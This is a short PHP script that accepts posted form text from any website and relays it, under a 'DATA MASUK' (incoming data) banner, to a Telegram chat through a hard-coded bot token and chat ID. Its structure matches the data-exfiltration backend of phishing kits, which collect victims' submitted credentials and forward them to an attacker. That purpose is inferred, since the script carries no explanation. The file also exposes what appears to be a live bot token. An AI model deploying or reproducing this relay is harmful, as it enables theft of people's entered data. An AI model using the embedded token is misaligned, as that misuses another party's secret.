<?php
header('Access-Control-Allow-Origin: *');
$token = "7914577945:AAFWwVLLenay0Hgj6hx-l-jPv-N0jGu3w0M";
$chatID = "7208824936";

$content = $_POST['message'];

if ($content==null || trim($content)=="") {
	return;
}

$newContent = '╭─════ DATA MASUK ════─╮\n';
$contentArray = preg_split("/\r\n|\n|\r/", $content);
for ($i=0; $i<sizeof($contentArray); $i++) {
	$contentArrayItem = $contentArray[$i];
	$line = str_pad($contentArrayItem, 21, " ");
	$newContent .= ("╠ ".$line." ╣\n");
}
$newContent .= '╰─══════════════════─╯\n';

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$token."/sendMessage?parse_mode=html");
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    "Content-Type: application/json"
]);
curl_setopt($ch, CURLOPT_POSTFIELDS,
            "{\"chat_id\":\"".$chatID."\",\"text\":\"<code>".$newContent."</code>\"}");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$server_output = curl_exec($ch);
curl_close($ch);
